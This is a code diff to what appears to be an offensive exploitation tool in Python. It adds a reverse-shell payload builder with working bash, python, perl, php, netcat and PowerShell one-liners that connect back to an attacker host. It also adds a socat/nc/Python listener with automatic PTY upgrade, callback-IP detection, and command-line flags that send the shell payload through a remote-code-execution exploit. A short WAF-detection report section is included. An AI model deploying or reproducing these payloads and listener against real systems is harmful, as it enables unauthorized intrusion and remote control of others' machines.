@@ -1574,38 +1574,129 @@ def subdomain_scan(domain, wordlist, port=80, tls=False,
 
 # ─── Reverse shell ────────────────────────────────────────────────────────────
 
-def start_shell_listener(port: int) -> threading.Thread:
-    import subprocess
+def _local_ip() -> str:
+    """Return the best local IP to use as reverse-shell callback address."""
+    # Prefer docker0 if present
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0]
+    except Exception:
+        return "127.0.0.1"
 
-    def _sock():
-        log(f"[*] Built-in listener on :{port}")
+
+def _build_shell_payload(shell_type: str, ip: str, port: int) -> str:
+    """Return a reverse-shell one-liner for the given type."""
+    t = shell_type.lower()
+    if t == "bash":
+        return f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
+    elif t == "python":
+        return (f"python3 -c 'import socket,subprocess,os;"
+                f"s=socket.socket();s.connect((\"{ip}\",{port}));"
+                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+                f"subprocess.call([\"/bin/sh\",\"-i\"])'")
+    elif t == "perl":
+        return (f"perl -e 'use Socket;$i=\"{ip}\";$p={port};"
+                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+                f"connect(S,sockaddr_in($p,inet_aton($i)));"
+                f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
+                f"exec(\"/bin/sh -i\");'")
+    elif t == "php":
+        return (f"php -r '$sock=fsockopen(\"{ip}\",{port});"
+                f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
+    elif t in ("nc", "netcat"):
+        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
+    elif t in ("ps", "powershell"):
+        return (f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
+                f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+                f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
+                f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+                f"$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
+                f"$x=[text.encoding]::ASCII.GetBytes($r2);$s.Write($x,0,$x.Length)}}\"")
+    else:
+        # default to python
+        return _build_shell_payload("python", ip, port)
+
+
+_PTY_UPGRADE = """\
+  ── PTY upgrade (run inside the shell) ───────────────────────────────
+  python3 -c 'import pty;pty.spawn("/bin/bash")'
+  # then: Ctrl+Z  →  stty raw -echo; fg  →  export TERM=xterm
+  ─────────────────────────────────────────────────────────────────────"""
+
+
+def start_shell_listener(port: int, upgrade: bool = False) -> threading.Thread:
+
+    def _sock_listener():
+        log(f"[*] Built-in listener — 0.0.0.0:{port}")
         srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         srv.bind(("0.0.0.0", port))
         srv.listen(1)
         try:
+            srv.settimeout(120)
             conn, addr = srv.accept()
-            log(f"[+] Shell from {addr[0]}:{addr[1]}")
+            log(f"\n[+] Shell connected from {addr[0]}:{addr[1]}")
+            log(_PTY_UPGRADE)
+
+            if upgrade:
+                _sleep(0.3)
+                conn.sendall(b"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n")
+                _sleep(0.5)
+
             while True:
                 r, _, _ = select.select([conn, sys.stdin], [], [], 1.0)
                 if conn in r:
                     data = conn.recv(4096)
-                    if not data: break
-                    sys.stdout.write(data.decode("utf-8", errors="replace"))
-                    sys.stdout.flush()
+                    if not data:
+                        log("[-] Shell closed.")
+                        break
+                    sys.stdout.buffer.write(data)
+                    sys.stdout.buffer.flush()
                 if sys.stdin in r:
                     line = sys.stdin.readline()
-                    if not line: break
+                    if not line:
+                        break
                     conn.sendall(line.encode())
+        except socket.timeout:
+            log("[!] Listener timed out — no connection received")
         except Exception as e:
             vlog(f"[v] Listener: {e}")
         finally:
-            srv.close()
+            try: srv.close()
+            except: pass
 
     def _run():
-        try:    __import__("subprocess").run(["nc", "-l", "-p", str(port)], check=True)
-        except FileNotFoundError: _sock()
-        except Exception as e:   vlog(f"[v] nc: {e}")
+        # try socat first (best interactive shell experience)
+        import shutil, subprocess
+        if shutil.which("socat"):
+            log(f"[*] socat listener — 0.0.0.0:{port}")
+            log(_PTY_UPGRADE)
+            try:
+                subprocess.run(
+                    ["socat", f"TCP-LISTEN:{port},reuseaddr,fork",
+                     "EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane"],
+                    check=True,
+                )
+                return
+            except Exception as e:
+                vlog(f"[v] socat: {e}")
+        # try nc
+        if shutil.which("nc"):
+            log(f"[*] nc listener — 0.0.0.0:{port}")
+            log(_PTY_UPGRADE)
+            try:
+                # try ncat / nc with -lvnp (Linux)
+                subprocess.run(["nc", "-lvnp", str(port)], check=True)
+                return
+            except Exception:
+                try:
+                    subprocess.run(["nc", "-l", str(port)], check=True)
+                    return
+                except Exception as e:
+                    vlog(f"[v] nc: {e}")
+        # pure-python fallback
+        _sock_listener()
 
     t = threading.Thread(target=_run, daemon=True)
     t.start()
@@ -1698,6 +1789,24 @@ def generate_html_report(host, port, findings, fingerprint=None, web_audit=None,
             web_html += "<h2>nginx stub_status (EXPOSED)</h2><table>"
             for k, v in stub.items():
                 web_html += f"<tr><td style='color:#8b949e;padding-right:16px'>{k}</td><td>{v}</td></tr>"
+            web_html += "</table>"
+
+        # WAF detection
+        waf = web_audit.get("waf")
+        if waf:
+            waf_color = "#ff4444" if waf.get("detected") else "#44aa44"
+            waf_label = waf.get("waf") or "None detected"
+            waf_conf  = waf.get("confidence", "")
+            web_html += f"<h2>WAF Detection</h2><table>"
+            web_html += (f"<tr><td style='color:#8b949e;padding-right:16px'>Detected</td>"
+                         f"<td style='color:{waf_color};font-weight:bold'>"
+                         f"{'YES — ' + waf_label if waf.get('detected') else 'No WAF detected'}</td></tr>")
+            if waf_conf:
+                web_html += (f"<tr><td style='color:#8b949e;padding-right:16px'>Confidence</td>"
+                             f"<td>{waf_conf}</td></tr>")
+            for ev in waf.get("evidence", []):
+                web_html += (f"<tr><td style='color:#8b949e;padding-right:16px'>Evidence</td>"
+                             f"<td>{ev}</td></tr>")
             web_html += "</table>"
 
     total_issues = len(findings) + len(web_audit.get("header_issues", []) if web_audit else [])
@@ -1804,6 +1913,11 @@ Usage examples
     ex.add_argument("--cmd",      metavar="CMD",  help="command to execute via RCE")
     ex.add_argument("--cmd-file", metavar="FILE", help="file with commands (one per line)")
     ex.add_argument("--shell",    action="store_true", help="pop a reverse shell")
+    ex.add_argument("--shell-type", metavar="TYPE", default="python",
+                    choices=["bash", "python", "perl", "php", "nc", "powershell"],
+                    help="reverse shell payload type (default: python)")
+    ex.add_argument("--upgrade-shell", action="store_true",
+                    help="auto-send PTY upgrade after shell connects")
 
     # ── Modes ─────────────────────────────────────────────────────────────────
     sp = parser.add_argument_group("special modes")
@@ -1861,7 +1975,8 @@ Usage examples
     # ── Reverse shell ─────────────────────────────────────────────────────────
     rs = parser.add_argument_group("reverse shell")
     rs.add_argument("--listen-port", type=int, default=1337)
-    rs.add_argument("--listen-ip",   default="172.17.0.1")
+    rs.add_argument("--listen-ip",   default="",
+                    help="IP the target connects back to (default: auto-detected)")
 
     # ── Exploit tuning ────────────────────────────────────────────────────────
     tu = parser.add_argument_group("exploit tuning")
@@ -1991,17 +2106,17 @@ Usage examples
                     cmd = "; ".join(cmds)
                     log(f"[*] Loaded {len(cmds)} commands from {args.cmd_file}")
                 elif args.shell:
-                    cmd = (f"python3 -c 'import socket,subprocess,os;"
-                           f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
-                           f"s.connect((\"{args.listen_ip}\",{args.listen_port}));"
-                           f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
-                           f"subprocess.call([\"/bin/sh\",\"-i\"])'")
+                    cb_ip = args.listen_ip or _local_ip()
+                    log(f"[*] Callback IP: {cb_ip}  (override with --listen-ip)")
+                    cmd = _build_shell_payload(args.shell_type, cb_ip, args.listen_port)
+                    log(f"[*] Shell type : {args.shell_type}")
+                    log(f"[*] Payload    : {cmd}")
                 else:
                     cmd = args.cmd
 
                 if args.shell:
-                    log(f"[*] Listening on :{args.listen_port} ...")
-                    start_shell_listener(args.listen_port)
+                    log(f"[*] Starting listener on 0.0.0.0:{args.listen_port} ...")
+                    start_shell_listener(args.listen_port, upgrade=args.upgrade_shell)
                     _sleep(1)
 
                 candidates = get_candidates()
